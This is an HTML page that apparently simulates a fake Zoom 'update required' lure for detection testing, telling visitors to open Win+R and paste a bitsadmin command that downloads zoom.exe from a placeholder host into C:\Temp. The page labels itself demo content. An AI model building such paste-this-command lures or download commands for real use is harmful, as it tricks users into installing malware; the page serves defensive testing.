...
<html lang="en">
  ...
  <body>
    <main class="card">
      <div class="kicker">Update required to continue</div>
      <h1>Zoom meeting update pending</h1>
      <p>Demo only. Simulates a forced update lure for detection testing.</p>
      <div class="grid">
        <section class="panel">
          <h3>Steps</h3>
          <ul class="steps">
            <li>Press Win + R</li>
<li>Paste the update line</li>
<li>Confirm</li>
          </ul>
        </section>
        <section class="panel">
          <h3>Command (demo)</h3>
          <div class="code">bitsadmin /transfer demo https://example.invalid/zoom.exe C:\Temp\zoom.exe</div>
          <div class="warn">Demo content only. Do not execute on real systems.</div>
        </section>
      </div>
      <a class="cta" href="#">Update Zoom</a>
    </main>
  </body>
</html>
